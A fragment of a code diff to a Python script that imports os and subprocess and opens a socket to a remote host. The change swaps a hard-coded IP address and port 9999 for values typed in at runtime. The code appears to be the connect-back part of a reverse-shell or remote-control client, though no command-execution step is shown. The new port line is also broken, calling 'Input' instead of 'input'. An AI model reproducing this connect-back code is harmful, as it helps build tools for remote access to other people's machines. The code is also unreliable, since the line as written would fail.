@@ -3,8 +3,8 @@ import os
 import subprocess
 
 s = socket.socket()
-host = '138.68.68.65'
-port = 9999
+host = input("Enter the IP : ")
+port = int(Input("Enter the  port: "))
 
 s.connect((host, port))
 
